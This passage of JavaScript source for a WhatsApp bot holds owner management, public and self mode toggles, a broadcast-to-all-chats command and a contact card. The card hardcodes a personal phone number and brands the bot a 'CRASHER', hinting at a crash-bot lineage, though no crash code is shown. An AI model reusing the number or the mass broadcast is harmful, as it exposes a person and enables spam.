    return Reply("*`T͜͡h͜͡i͜͡s͜͡ n͜͡u͜͡m͜͡b͜͡e͜͡r͜͡ i͜͡s͜͡ a͜͡l͜͡r͜͡e͜͡a͜͡d͜͡y͜͡ a͜͡n͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡!*");

  owner.push(gun);
  fs.writeFileSync("./database/owner.json", JSON.stringify(owner, null, 2));

  Reply(
    `*\`N͜͡u͜͡m͜͡b͜͡e͜͡r͜͡ ${gun}\nA͜͡d͜͡d͜͡e͜͡d͜͡ S͜͡u͜͡c͜͡c͜͡e͜͡s͜͡s͜͡f͜͡u͜͡l͜͡l͜͡y͜͡ 🏆💪\nT͜͡o͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡ L͜͡i͜͡s͜͡t͜͡!\`*`
  );
}
break;


// ===================== DELETE OWNER =====================
case "delowner": {
  if (!isCreator)
    return Reply("O͜͡n͜͡l͜͡y͜͡ F͜͡o͜͡r͜͡ m͜͡y͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡ 👑");

  if (!args[0])
    return Reply(
      `_*I͜͡n͜͡c͜͡o͜͡r͜͡r͜͡e͜͡c͜͡t͜͡ U͜͡s͜͡a͜͡g͜͡e͜͡!*_\n\n` +
      `E͜͡x͜͡a͜͡m͜͡p͜͡l͜͡e͜͡:\n${prefix + command} 234xxxxxxxx`
    );

  const yes =
    q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const index = owner.indexOf(yes);
  if (index === -1)
    return Reply("*`T͜͡h͜͡i͜͡s͜͡ n͜͡u͜͡m͜͡b͜͡e͜͡r͜͡ i͜͡s͜͡ n͜͡o͜͡t͜͡ a͜͡n͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡!*");

  owner.splice(index, 1);
  fs.writeFileSync("./database/owner.json", JSON.stringify(owner, null, 2));

  Reply(
    `*\`N͜͡u͜͡m͜͡b͜͡e͜͡r͜͡ ${yes}\nR͜͡e͜͡m͜͡o͜͡v͜͡e͜͡d͜͡ S͜͡u͜͡c͜͡c͜͡e͜͡s͜͡s͜͡f͜͡u͜͡l͜͡l͜͡y͜͡ 😭\nF͜͡r͜͡o͜͡m͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡ L͜͡i͜͡s͜͡t͜͡!\`*`
  );
}
break;
// ===================== PUBLIC MODE =====================
case "public": {
  if (!isCreator)
    return Reply("O͜͡n͜͡l͜͡y͜͡ F͜͡o͜͡r͜͡ m͜͡y͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡ 👑");

  if (stillchasing.public === true) {
    return stillchasing.sendMessage(
      m.chat,
      {
        text: "*`B͜͡o͜͡t͜͡ i͜͡s͜͡ a͜͡l͜͡r͜͡e͜͡a͜͡d͜͡y͜͡ i͜͡n͜͡ P͜͡u͜͡b͜͡l͜͡i͜͡c͜͡ M͜͡o͜͡d͜͡e͜͡ 🌍`*",
        buttons: [
          {
            buttonId: `${prefix}self`,
            buttonText: { displayText: "🔒 S𝗲𝗹𝗳 𝗠𝗼𝗱𝗲" },
            type: 1
          }
        ],
        footer: "© 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴🔥",
        headerType: 1
      },
      { quoted: lol }
    );
  }

  stillchasing.public = true;

  await stillchasing.sendMessage(
    m.chat,
    {
      text:
        "*`M͜͡o͜͡d͜͡e͜͡ S͜͡w͜͡i͜͡t͜͡c͜͡h͜͡e͜͡d͜͡!\n\n" +
        "✔ S͜͡t͜͡a͜͡t͜͡u͜͡s͜͡ : P͜͡u͜͡b͜͡l͜͡i͜͡c͜͡ 🌍\n" +
        "✔ A͜͡l͜͡l͜͡ U͜͡s͜͡e͜͡r͜͡s͜͡ c͜͡a͜͡n͜͡ u͜͡s͜͡e͜͡ t͜͡h͜͡i͜͡s͜͡ b͜͡o͜͡t͜͡!`*",
      buttons: [
        {
          buttonId: `${prefix}self`,
          buttonText: { displayText: "🔒 S𝗲𝗹𝗳 𝗠𝗼𝗱𝗲" },
          type: 1
        }
      ],
      footer: "© 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴🔥",
      headerType: 1
    },
    { quoted: lol }
  );
}
break;


// ===================== SELF MODE =====================
case "self": {
  if (!isCreator)
    return Reply("O͜͡n͜͡l͜͡y͜͡ F͜͡o͜͡r͜͡ m͜͡y͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡ 👑");

  if (stillchasing.public === false) {
    return stillchasing.sendMessage(
      m.chat,
      {
        text: "*`B͜͡o͜͡t͜͡ i͜͡s͜͡ a͜͡l͜͡r͜͡e͜͡a͜͡d͜͡y͜͡ i͜͡n͜͡ S͜͡e͜͡l͜͡f͜͡ M͜͡o͜͡d͜͡e͜͡ 🔒`*",
        buttons: [
          {
            buttonId: `${prefix}public`,
            buttonText: { displayText: "🌍 P𝘂𝗯𝗹𝗶𝗰 𝗠𝗼𝗱𝗲" },
            type: 1
          }
        ],
        footer: "© 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴",
        headerType: 1
      },
      { quoted: lol }
    );
  }

  stillchasing.public = false;

  await stillchasing.sendMessage(
    m.chat,
    {
      text:
        "*`M͜͡o͜͡d͜͡e͜͡ S͜͡w͜͡i͜͡t͜͡c͜͡h͜͡e͜͡d͜͡!\n\n" +
        "✔ S͜͡t͜͡a͜͡t͜͡u͜͡s͜͡ : S͜͡e͜͡l͜͡f͜͡ 🔒\n" +
        "✔ O͜͡n͜͡l͜͡y͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡ c͜͡a͜͡n͜͡ u͜͡s͜͡e͜͡ t͜͡h͜͡i͜͡s͜͡ b͜͡o͜͡t͜͡!`*",
      buttons: [
        {
          buttonId: `${prefix}public`,
          buttonText: { displayText: "🌍 P𝘂𝗯𝗹𝗶𝗰 𝗠𝗼𝗱𝗲" },
          type: 1
        }
      ],
      footer: "© 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴🔥",
      headerType: 1
    },
    { quoted: lol }
  );
}
break
case "broadcast":
case "bc": {
if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")
  if (!q) return Reply("❌ Text required")

  let chats = await stillchasing.chats.all()
  let success = 0

  for (let chat of chats) {
    if (chat.id.endsWith("@s.whatsapp.net")) {
      await stillchasing.sendMessage(chat.id, { text: q })
      success++
    }
  }

  Reply(`
╔══════════════════════╗
║ 📢 BROADCAST SENT
╠══════════════════════╣
║ 💬 Chats : ${success}
║ 🚀 Status : Success
╚══════════════════════╝
`)
}
break
case "dev":
case "devoloper":
case "owner": {
  let nameown = `𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴👩‍💻`
  let NoOwn = `2349017593981`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: nameown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${nameown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴🐉\nX-WA-BIZ-NAME:[[ ༑ 𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
  })
  stillchasing.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}


break;

    default:
        break;
}
} catch (err) {
    console.log(util.format(err))
}
}

//~~~~~Status updated~~~~~//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file]
    require(file)
})